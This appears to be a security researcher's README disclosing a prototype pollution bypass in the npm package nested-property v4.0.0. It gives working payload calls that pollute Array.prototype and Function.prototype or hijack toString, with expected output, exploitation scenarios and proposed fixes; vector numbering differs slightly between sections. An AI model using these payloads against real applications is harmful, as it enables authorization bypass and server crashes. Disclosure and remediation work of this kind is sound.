# Prototype Pollution Research: Incomplete Fix Bypass in `nested-property` v4.0.0

**Date:** April 2, 2026  
**Researcher:** Ojas Mehta  
**Package:** [`nested-property`](https://www.npmjs.com/package/nested-property) (NPM) — v4.0.0 (latest)  
**License:** MIT  
**Disclosure status:**
- Snyk: Disclosed April 2, 2026 — advisory declined (classified as JS semantics, not package scope)
- MITRE CVE Program: Request filed April 2, 2026 — acknowledgment received (CVE Request 2019608)
- webdav maintainer (Perry Mitchell): Notified April 3, 2026 with full PoC and remediation guidance
> **⚠️ DISCLAIMER:** Snyk has officially declined to issue a security advisory for this vulnerability, classifying it as expected "JavaScript semantics" rather than a package-scoped vulnerability. Automated vulnerability scanners will **not** flag this package as vulnerable. Use at your own risk.

---

## 1. Summary

The v4.0.0 fix for prototype pollution in `nested-property` introduces an **incomplete guard** that only blocks mutation of `Object.prototype`. An attacker can still pollute `Array.prototype` and `Function.prototype` by:

- Using a non-plain-object (`[]`, `{}` with array-rooted path) as the root target
- Traversing through `constructor.__proto__`

All **four attack vectors** below are **confirmed reproducible** on the latest published version (v4.0.0, Node.js v22.22.2).

---

## 2. Installation & Verification

> **Requirements:** Node.js v16 or higher, npm

### Step 1 — Clone this repository

```bash
git clone https://github.com/blah-blah-cell/nested-property-prototype-pollution-research.git
cd nested-property-prototype-pollution-research
```

### Step 2 — Install dependencies

```bash
npm install
```

This installs `nested-property@4.0.0` exactly as pinned in `package.json`. Verify:

```bash
npm list nested-property
# expected: nested-property@4.0.0
```

### Step 3 — Run the PoC

```bash
npm run poc
# or: node poc.js
```

### Expected output

```
=== nested-property v4.0.0 — Prototype Pollution Bypass PoC ===
Researcher: Ojas Mehta | Date: April 2, 2026

--- Vector 1: Array.prototype via __proto__ ---
[1] Array.prototype.polluted: true
[1] Object.prototype.polluted: undefined
[1] [].polluted: true

--- Vector 2: Function.prototype via constructor.__proto__ ---
[2] Function.prototype.polluted: true
[2] (function(){}).polluted: true

--- Vector 3: Array.prototype method hijacking ---
[3] [1,2,3].toString(): HIJACKED
[3] ({}).toString(): [object Object]

--- Vector 4: Array root + constructor.prototype ---
[4] [].injected: owned
[4] ({}).injected: undefined

=== All 4 vectors confirmed. Object.prototype guard bypassed silently. ===
Note: No ObjectPrototypeMutationError was thrown for any of the above.


```

**What to look for:**
- `Array.prototype.polluted: true` — guard bypassed for arrays (Vector 1)
- `Object.prototype.polluted: undefined` — confirms `Object.prototype` is protected, everything else is not
- `[1,2,3].toString(): HIJACKED` — native method silently overridden (Vector 3)

- **No `ObjectPrototypeMutationError` anywhere** — all vectors succeed silently

### Step 4 — Verify the fix

Run the remediation validation script to confirm both proposed defenses block all 4 vectors:

```bash
npm run fix
# or: node fix-recommendation.js
```

### Expected fix output

```
=== Fix Validation ===
[PASS] Vector 1: blocked — Blocked: dangerous path segment in "data.__proto__.polluted"
[PASS] Vector 2: blocked — Blocked: dangerous path segment in "constructor.__proto__.polluted"
[PASS] Vector 3: blocked — Blocked: dangerous path segment in "data.__proto__.toString"
[PASS] Vector 4: blocked — Blocked: dangerous path segment in "constructor.prototype.injected"
[PASS] Safe path allowed: {"user":{"profile":{"name":"Alice"}}}

Fix validation complete.
```

All 4 vectors blocked. Safe paths (no dangerous segments) still pass through correctly.

---

## 3. Root Cause

The guard added in v4.0.0 (`nested-property/dist/nested-property.js`, line 166):

```js
if (currentObject === Reflect.getPrototypeOf({})) {
  throw new ObjectPrototypeMutationError("Attempting to mutate Object.prototype");
}
```

`Reflect.getPrototypeOf({})` returns exactly `Object.prototype`. This is a **strict identity comparison against a single object** — it does not protect any other prototype in the chain:

- `Array.prototype` → **unguarded**
- `Function.prototype` → **unguarded**
- Any other built-in prototype → **unguarded**

---

## 4. Confirmed Attack Vectors (v4.0.0)

### Vector 1 — `Array.prototype` pollution via `__proto__` key

```js
np.set({ data: [] }, "data.__proto__.polluted", true);
// Array.prototype.polluted === true  (ALL arrays in process affected)
// Object.prototype.polluted === undefined  (guard incorrectly considered this "safe")
```

### Vector 2 — `Function.prototype` pollution via `constructor.__proto__`

```js
np.set({}, "constructor.__proto__.polluted", true);
// Function.prototype.polluted === true  (ALL functions in process affected)
// Object.prototype.polluted === undefined
```

### Vector 3 — `Array.prototype` pollution via Array root + `constructor.prototype`

```js
np.set([], "constructor.prototype.injected", "owned");
// [].injected === "owned"  (ALL arrays affected)
// ({}).injected === undefined
```

### Vector 4 — `Array.prototype` method hijacking (highest impact)

```js
np.set({ data: [] }, "data.__proto__.toString", () => "HIJACKED");
// [1,2,3].toString() === "HIJACKED"  — native method silently overridden
// ({}).toString() === "[object Object]"  — plain objects unaffected
```

---

## 5. Full PoC

See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.0`.

**Confirmed output:**
```
[1] Array.prototype.polluted: true
[1] Object.prototype.polluted: undefined
[1] [].polluted: true
[2] Function.prototype.polluted: true
[2] (function(){}).polluted: true
[3] [1,2,3].toString(): HIJACKED
[3] ({}).toString(): [object Object]
[4] [].injected: owned
[4] ({}).injected: undefined
```

---

## 6. Impact

| Impact | Scope | Severity |
|---|---|---|
| Array method hijacking (`toString`, `join`, `map`, `filter`, ...) | All arrays in the Node.js process | High |
| Function.prototype pollution (middleware, handlers, callbacks) | All functions in the process | High |
| Process-wide persistence (survives all requests until restart) | Entire application | Critical |
| Silent — no throw, no log | Unlike `Object.prototype` guard | Critical |

### Real-World Exploitation Scenarios
- **Instant Denial of Service (DoS):** By overwriting an array method like `Array.prototype.map` with a non-function value, the entire Node.js server will crash with a `TypeError` the next time the application maps an array.
- **Defeating Security Filters:** Applications often rely on arrays for whitelists (`allowedRoles.includes(user.role)`). An attacker can pollute `Array.prototype.includes = () => true`, instantly bypassing authorization checks process-wide.
- **Remote Code Execution (RCE):** If the backend renders HTML templates (like Pug, EJS, or Handlebars), an attacker can pollute `Function.prototype` or `Array.prototype.push` to hijack the template compilation engine and inject arbitrary JavaScript, achieving full server compromise.

**Key distinguisher:** The `Object.prototype` guard in v4.0.0 throws a named `ObjectPrototypeMutationError`. These vectors succeed **silently** — no exception is raised, no log is written. Detection requires active monitoring of prototype chains.

---

## 7. Supply Chain Context

`nested-property` is a transitive dependency of `webdav` v5.9.0 (and other packages). Any application that:

1. Uses `webdav` or similar packages that call `nestedProperty.set()` internally
2. Passes **user-controlled data** through those operations (e.g., WebDAV PROPPATCH, PROPFIND, or resource metadata updates)

...is exposed to process-wide prototype pollution, enabling:

- **Authentication bypass** (if auth checks rely on Array/Function prototype methods downstream)
- **Denial of service** (via method hijacking that causes downstream crashes)
- **Silent data corruption** (polluted methods producing wrong results for all subsequent requests)

---

## 8. Discovery Methodology

1. **Source analysis:** Read `nested-property/dist/nested-property.js`, identified the guard as a single strict identity check against `Reflect.getPrototypeOf({})`.
2. **Guard boundary mapping:** Determined the guard exclusively matches `Object.prototype` — nothing else in the prototype chain.
3. **Vector enumeration:** Systematically tested non-plain-object roots (`[]`, `function(){}`) and indirect traversal paths (`__proto__`, `constructor.__proto__`).
4. **Exploitability confirmation:** Verified method hijacking via `Array.prototype.toString` override; confirmed scope is process-wide and persistent.

---

## 9. Remediation

See [`fix-recommendation.js`](./fix-recommendation.js) for full patched implementation.

### Fix 1 — Extend the prototype guard

```js
const PROTECTED_PROTOS = new Set([
  Object.prototype,
  Array.prototype,
  Function.prototype,
  Number.prototype,
  String.prototype,
  Boolean.prototype,
]);

if (PROTECTED_PROTOS.has(currentObject)) {
  throw new Error("Blocked: mutation of built-in prototype");
}
```

### Fix 2 — Segment-level denylist (defense in depth)

```js
const DANGEROUS_KEYS = ["__proto__", "constructor", "prototype"];
const isSafe = (path) => !path.split(".").some(s => DANGEROUS_KEYS.includes(s));
```

**Both defenses should be applied together.**

---

## 10. Disclosure Timeline

| Date | Action |
|---|---|
| April 2, 2026 | Vulnerability discovered and confirmed on Node.js v22.22.2 |
| April 2, 2026 | Snyk responsible disclosure filed via report@snyk.io |
| April 2, 2026 | MITRE CVE Program request filed (CVE Request 2019608) |
| April 3, 2026 | Direct disclosure to webdav maintainer Perry Mitchell |
| May 4, 2026 | Snyk acknowledges receipt, begins maintainer contact |
| May 11, 2026 | Snyk declines advisory — classifies as JS semantics, not package scope |
| June 4, 2026 | Public disclosure — 60+ days elapsed, no patch or maintainer response |

---

## 11. Status

**Unpatched as of June 4, 2026.** CVE assignment pending (MITRE CVE Request 2019608). Public disclosure made after 60+ days with no response from the maintainer. Treat all `nested-property` v4.0.0 usage with user-controlled paths as vulnerable.

---

*Research by Ojas Mehta. For questions, contact via GitHub. See [SECURITY.md](./SECURITY.md) for ethical use policy.*
